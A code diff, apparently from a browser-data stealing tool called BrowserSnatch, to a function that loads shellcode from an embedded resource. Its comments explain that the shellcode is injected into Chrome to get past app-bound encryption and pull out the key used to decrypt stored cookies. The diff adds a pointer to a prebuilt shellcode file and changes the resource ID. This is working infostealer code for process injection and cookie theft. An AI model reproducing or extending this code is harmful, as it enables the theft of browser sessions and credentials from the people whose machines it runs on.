@@ -191,8 +191,10 @@ std::string retrieve_chrome_key()
 	* The shellcode is injected into chrome itself to bypass app-bound checks
 	* The decrypted key is saved as a dat file in public which is used by BrowserSnatch for cookies decryption
 	* The ChromeInjector project contains the code for retrieving app-bound decrypted key and converted into shellcode by tool named Donut
+	* The shellcode for extracting key is available in Chrome_key_retriever_shellcode/extract_key.bin
+	* Simply import the .bin file as a custom BINARY resource
 	*/
-	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(103), L"BINARY");
+	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(102), L"BINARY");
 	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
 	HGLOBAL shellcodeResourceData = LoadResource(NULL, shellcodeResource);
 
